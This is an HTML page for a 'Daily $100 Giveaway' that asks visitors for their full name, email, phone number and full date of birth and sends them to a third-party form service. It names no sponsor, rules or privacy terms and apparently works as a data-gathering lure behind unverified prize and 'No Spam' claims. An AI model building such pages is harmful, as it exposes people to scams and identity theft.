<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Birthday Giveaway</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;800&display=swap" rel="stylesheet">

<style>

body {
    margin: 0;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(-45deg, #ff00cc, #ff8c00, #00f5ff, #ff0000);
    background-size: 600% 600%;
    animation: bgMove 6s ease infinite;
    overflow: hidden;
}

@keyframes bgMove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

/* Confetti */
.confetti {
    position: fixed;
    top: -10px;
    width: 10px;
    height: 10px;
    animation: fall linear infinite;
    opacity: 0.9;
}

@keyframes fall {
    to {
        transform: translateY(110vh) rotate(720deg);
    }
}

/* Fireworks */
.firework {
    position: fixed;
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: white;
    animation: explode 1s ease-out forwards;
}

@keyframes explode {
    0% { transform: scale(1); opacity: 1; }
    100% { transform: scale(20); opacity: 0; }
}

/* Layout */
.wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
    position: relative;
    z-index: 5;
}

.card {
    background: rgba(255,255,255,0.95);
    padding: 50px 40px;
    border-radius: 25px;
    width: 100%;
    max-width: 520px;
    text-align: center;
    box-shadow: 0 0 40px #ff00cc, 0 0 80px #ff8c00;
    animation: bounceIn 0.7s ease;
    border: 4px solid transparent;
    background-clip: padding-box;
    position: relative;
}

.card::before {
    content: "";
    position: absolute;
    inset: -4px;
    background: linear-gradient(45deg, #ff00cc, #ff8c00, #00f5ff, #ff0000);
    z-index: -1;
    border-radius: 30px;
    animation: rotateBorder 4s linear infinite;
}

@keyframes rotateBorder {
    0% { filter: hue-rotate(0deg); }
    100% { filter: hue-rotate(360deg); }
}

@keyframes bounceIn {
    0% { transform: scale(0.5); opacity: 0; }
    60% { transform: scale(1.1); }
    100% { transform: scale(1); opacity: 1; }
}

.badge {
    background: linear-gradient(90deg, #ff00cc, #ff8c00);
    color: white;
    padding: 10px 25px;
    border-radius: 50px;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 25px;
    animation: pulse 1.5s infinite;
}

@keyframes pulse {
    0% { transform: scale(1); }
    50% { transform: scale(1.08); }
    100% { transform: scale(1); }
}

h1 {
    font-size: 44px;
    font-weight: 800;
    margin-bottom: 15px;
    animation: wiggle 2s infinite;
}

@keyframes wiggle {
    0%,100% { transform: rotate(0deg); }
    25% { transform: rotate(-2deg); }
    75% { transform: rotate(2deg); }
}

.sub {
    font-size: 16px;
    margin-bottom: 30px;
}

input, select {
    width: 100%;
    padding: 15px;
    margin: 10px 0;
    border-radius: 12px;
    border: 2px solid #eee;
    font-size: 15px;
}

.phone-group {
    display: flex;
    gap: 8px;
}

.phone-group select {
    width: 100px;
}

.phone-group input {
    flex: 1;
}

.dob-group {
    display: flex;
    gap: 10px;
}

button {
    width: 100%;
    padding: 20px;
    margin-top: 20px;
    border: none;
    border-radius: 15px;
    background: linear-gradient(90deg, #ff00cc, #ff8c00);
    color: white;
    font-size: 22px;
    font-weight: 800;
    cursor: pointer;
    position: relative;
    overflow: hidden;
}

button::after {
    content: "";
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: rgba(255,255,255,0.4);
    transform: skewX(-20deg);
    animation: shine 2s infinite;
}

@keyframes shine {
    0% { left: -100%; }
    100% { left: 200%; }
}

.trust {
    margin-top: 18px;
    font-size: 13px;
}

</style>
</head>

<body>

<script>
// Confetti
for (let i = 0; i < 80; i++) {
    let confetti = document.createElement("div");
    confetti.classList.add("confetti");
    confetti.style.left = Math.random() * 100 + "vw";
    confetti.style.background = ["#ff00cc","#ff8c00","#00f5ff","#ffffff"][Math.floor(Math.random()*4)];
    confetti.style.animationDuration = (Math.random() * 2 + 2) + "s";
    confetti.style.width = confetti.style.height = (Math.random() * 10 + 5) + "px";
    document.body.appendChild(confetti);
}

// Fireworks every 3 seconds
setInterval(() => {
    let fw = document.createElement("div");
    fw.classList.add("firework");
    fw.style.left = Math.random() * 100 + "vw";
    fw.style.top = Math.random() * 50 + "vh";
    fw.style.background = ["#ff00cc","#ff8c00","#00f5ff","#ffffff"][Math.floor(Math.random()*4)];
    document.body.appendChild(fw);
    setTimeout(() => fw.remove(), 1000);
}, 3000);
</script>

<div class="wrapper">
    <div class="card">

        <div class="badge">🎉 DAILY $100 GIVEAWAY 🎉</div>

        <h1>YOU COULD WIN BIG</h1>
        <div class="sub">Enter your birthday. Get entered every single year.</div>

        <form action="https://formspree.io/f/xpqjgdww" method="POST">

            <input type="text" name="name" placeholder="Full Name" required>
            <input type="email" name="email" placeholder="Email Address" required>

            <div class="phone-group">
                <select name="country_code" required>
                    <option value="+61">+61</option>
                    <option value="+1">+1</option>
                    <option value="+44">+44</option>
                    <option value="+64">+64</option>
                </select>
                <input type="tel" name="phone" placeholder="Phone Number" required>
            </div>

            <div class="dob-group">
                <input type="text" name="dob_day" placeholder="DD" maxlength="2" required>
                <input type="text" name="dob_month" placeholder="MM" maxlength="2" required>
                <input type="text" name="dob_year" placeholder="YYYY" maxlength="4" required>
            </div>

            <button type="submit">ENTER NOW 🚀</button>

        </form>

        <div class="trust">
            Free Entry • No Spam • Instant Registration
        </div>

    </div>
</div>

</body>
</html>
